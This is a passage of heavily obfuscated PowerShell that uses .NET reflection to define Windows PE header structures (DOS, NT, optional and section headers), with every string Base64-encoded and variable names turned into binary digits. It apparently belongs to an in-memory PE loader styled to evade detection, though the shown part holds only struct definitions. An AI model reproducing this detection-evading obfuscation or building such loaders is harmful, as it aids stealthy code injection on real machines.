		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBvAHUAbgBkAEkAbQBwAG8AcgB0AA=='))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(200) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAFQA'))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(208) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AEkAbQBwAG8AcgB0AEQAZQBzAGMAcgBpAHAAdABvAHIA'))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(216) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBMAFIAUgB1AG4AdABpAG0AZQBIAGUAYQBkAGUAcgA='))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(224) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(232) | Out-Null
		${01110001000000001} = ${01100110111100111}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value ${01110001000000001}
		${10011010100101001} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
		${01100110111100111} = ${10001000111011001}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATwBQAFQASQBPAE4AQQBMAF8ASABFAEEARABFAFIAMwAyAA=='))), ${10011010100101001}, [System.ValueType], 224)
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAA=='))), ${01011011010110100}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(2) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(3) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBuAGkAdABpAGEAbABpAHoAZQBkAEQAYQB0AGEA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(8) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAVQBuAGkAbgBpAHQAaQBhAGwAaQB6AGUAZABEAGEAdABhAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(12) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARQBuAHQAcgB5AFAAbwBpAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(16) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(20) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYARABhAHQAYQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(24) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAGEAZwBlAEIAYQBzAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(28) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdABpAG8AbgBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(32) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(36) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(40) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(42) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(44) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(46) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(48) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(50) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAFYAZQByAHMAaQBvAG4AVgBhAGwAdQBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(52) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(56) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(60) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFMAdQBtAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(64) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAcwB5AHMAdABlAG0A'))), ${10000001011110001}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(68) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), ${01101010000001001}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(70) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAFIAZQBzAGUAcgB2AGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(72) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAEMAbwBtAG0AaQB0AA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(76) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABSAGUAcwBlAHIAdgBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(80) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABDAG8AbQBtAGkAdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(84) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABlAHIARgBsAGEAZwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(88) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAdgBhAEEAbgBkAFMAaQB6AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(92) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbwByAHQAVABhAGIAbABlAA=='))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(96) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAVABhAGIAbABlAA=='))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(104) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwB1AHIAYwBlAFQAYQBiAGwAZQA='))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(112) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBwAHQAaQBvAG4AVABhAGIAbABlAA=='))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(120) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBlAHIAdABpAGYAaQBjAGEAdABlAFQAYQBiAGwAZQA='))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(128) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBSAGUAbABvAGMAYQB0AGkAbwBuAFQAYQBiAGwAZQA='))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(136) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGIAdQBnAA=='))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(144) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQByAGMAaABpAHQAZQBjAHQAdQByAGUA'))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(152) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBsAG8AYgBhAGwAUAB0AHIA'))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(160) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABMAFMAVABhAGIAbABlAA=='))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(168) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABDAG8AbgBmAGkAZwBUAGEAYgBsAGUA'))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(176) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBvAHUAbgBkAEkAbQBwAG8AcgB0AA=='))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(184) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBBAFQA'))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(192) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AEkAbQBwAG8AcgB0AEQAZQBzAGMAcgBpAHAAdABvAHIA'))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(200) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBMAFIAUgB1AG4AdABpAG0AZQBIAGUAYQBkAGUAcgA='))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(208) | Out-Null
		(${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))), ${00111110101011000}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(216) | Out-Null
		${01101100111100001} = ${01100110111100111}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value ${01101100111100001}
		${10011010100101001} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${01100110111100111} = ${10001000111011001}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ASABFAEEARABFAFIAUwA2ADQA'))), ${10011010100101001}, [System.ValueType], 264)
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBIAGUAYQBkAGUAcgA='))), ${01100101100110010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), ${01110001000000001}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${10011010111100011} = ${01100110111100111}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value ${10011010111100011}
		${10011010100101001} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${01100110111100111} = ${10001000111011001}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ASABFAEEARABFAFIAUwAzADIA'))), ${10011010100101001}, [System.ValueType], 248)
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBIAGUAYQBkAGUAcgA='))), ${01100101100110010}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), ${01101100111100001}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${00100111101110111} = ${01100110111100111}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value ${00100111101110111}
		${10011010100101001} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${01100110111100111} = ${10001000111011001}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABPAFMAXwBIAEUAQQBEAEUAUgA='))), ${10011010100101001}, [System.ValueType], 64)
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AYQBnAGkAYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAYgBsAHAA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcgBsAGMA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcABhAHIAaABkAHIA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AaQBuAGEAbABsAG8AYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG0AYQB4AGEAbABsAG8AYwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHMAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHMAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcwB1AG0A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGkAcAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGMAcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGwAZgBhAHIAbABjAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AdgBuAG8A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${00101110010011110} = ${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHIAZQBzAA=='))), [UInt16[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
		${01011000010110111} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		${00001001110110101} = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBDAG8AbgBzAHQA')))))
		${10110110110101100} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${01110011100100001}, ${01011000010110111}, ${00001001110110101}, @([Int32] 4))
		${00101110010011110}.SetCustomAttribute(${10110110110101100})
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AZQBtAGkAZAA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAG8AZQBtAGkAbgBmAG8A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${00111110101101001} = ${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAHIAZQBzADIA'))), [UInt16[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
		${01011000010110111} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		${10110110110101100} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${01110011100100001}, ${01011000010110111}, ${00001001110110101}, @([Int32] 10))
		${00111110101101001}.SetCustomAttribute(${10110110110101100})
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZQBfAGwAZgBhAG4AZQB3AA=='))), [Int32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${00000101100100100} = ${01100110111100111}.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value ${00000101100100100}
		${10011010100101001} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${01100110111100111} = ${10001000111011001}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBFAEMAVABJAE8ATgBfAEgARQBBAEQARQBSAA=='))), ${10011010100101001}, [System.ValueType], 40)
		${00000000010110100} = ${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA='))), [Char[]], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMALAAgAEgAYQBzAEYAaQBlAGwAZABNAGEAcgBzAGgAYQBsAA=='))))
		${01011000010110111} = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		${10110110110101100} = New-Object System.Reflection.Emit.CustomAttributeBuilder(${01110011100100001}, ${01011000010110111}, ${00001001110110101}, @([Int32] 8))
		${00000000010110100}.SetCustomAttribute(${10110110110101100})
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABTAGkAegBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${01100110111100111}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
